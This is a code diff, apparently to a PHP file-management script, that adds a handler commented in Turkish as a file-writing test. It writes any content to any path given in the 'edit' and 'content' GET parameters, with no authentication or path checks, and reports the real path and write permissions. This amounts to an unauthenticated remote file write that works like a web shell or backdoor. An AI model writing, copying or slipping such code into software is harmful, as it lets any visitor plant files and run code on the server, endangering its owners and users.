@@ -88,4 +88,33 @@ if (isset($_GET['delete'])) {
     }
 }
 
+
+//Dosya değiştirme veya ekleme
+if (isset($_GET['edit']) && isset($_GET['content'])) {
+    $hedef_dosya = $_GET['edit'];
+    $yeni_icerik = $_GET['content'];
+
+    echo "<h3>Dosya Yazma Testi</h3>";
+    echo "Hedef Yol: " . htmlspecialchars($hedef_dosya) . "<br>";
+    echo "Tam Yol (Realpath): " . var_export(realpath($hedef_dosya), true) . "<br>";
+
+    // Klasörün veya dosyanın yazılabilir olup olmadığını kontrol edelim
+    if (!is_writable(dirname($hedef_dosya))) {
+        echo "<b style='color:red;'>HATA: Hedef klasör (uploads veya üstü) yazılabilir değil! (İzin Sorunu)</b><br>";
+    }
+
+    // Dosyayı yazmayı dene ve hatayı yakala
+    try {
+        $sonuc = file_put_contents($hedef_dosya, $yeni_icerik);
+        if ($sonuc !== false) {
+            echo "<b style='color:green;'>BAŞARILI! " . $sonuc . " bayt yazıldı.</b>";
+        } else {
+            echo "<b style='color:red;'>HATA: file_put_contents 'false' döndürdü.</b>";
+        }
+    } catch (Exception $e) {
+        echo "<b style='color:red;'>Yazma Hatası: " . $e->getMessage() . "</b>";
+    }
+    exit;
+}
+    
 ?>
